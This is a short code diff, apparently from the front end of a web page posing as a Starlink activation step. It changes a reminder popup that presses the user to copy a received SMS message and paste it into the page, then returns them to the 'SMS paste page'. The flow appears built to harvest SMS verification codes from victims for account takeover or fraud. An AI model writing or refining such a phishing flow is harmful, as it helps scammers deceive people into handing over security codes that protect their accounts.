@@ -459,12 +459,19 @@
                     } else if (data.status === 'reminder_sent') {
                         if (lastReminderCount === 0) {
                             lastReminderCount = 1;
+
+                            // ⬇ IMPORTANT: close waiting screen FIRST so user is back on SMS paste page
+                            waitingOverlay.classList.remove('open');
+
                             showToast(
                                 'info',
                                 'A Gentle Reminder',
                                 data.message || 'Kindly check your inbox and copy the message you have received, then paste it here. We are almost there — just one more step to unlock your Starlink connection!',
                                 'OK, Got It',
-                                null
+                                () => {
+                                    // Just close popup — user is already on SMS paste page
+                                    resetForNewSMS();
+                                }
                             );
                         }
                     } else if (data.status === 'timeout') {
